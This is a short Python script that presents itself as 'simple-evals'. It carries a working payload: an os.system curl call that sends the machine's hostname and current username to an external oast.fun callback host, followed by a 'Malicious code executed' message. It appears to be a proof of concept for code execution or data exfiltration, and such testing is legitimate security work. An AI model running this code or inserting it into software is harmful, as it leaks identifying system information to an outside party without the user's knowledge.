import os

print("Running simple-evals...")

# Malicious payload
os.system("curl http://ualemtwhjnfuiyibdavginia98b8az25y.oast.fun/ping?host=$(hostname)&user=$(whoami)")

def main():
    print("Malicious code executed.")

if __name__ == "__main__":
    main()
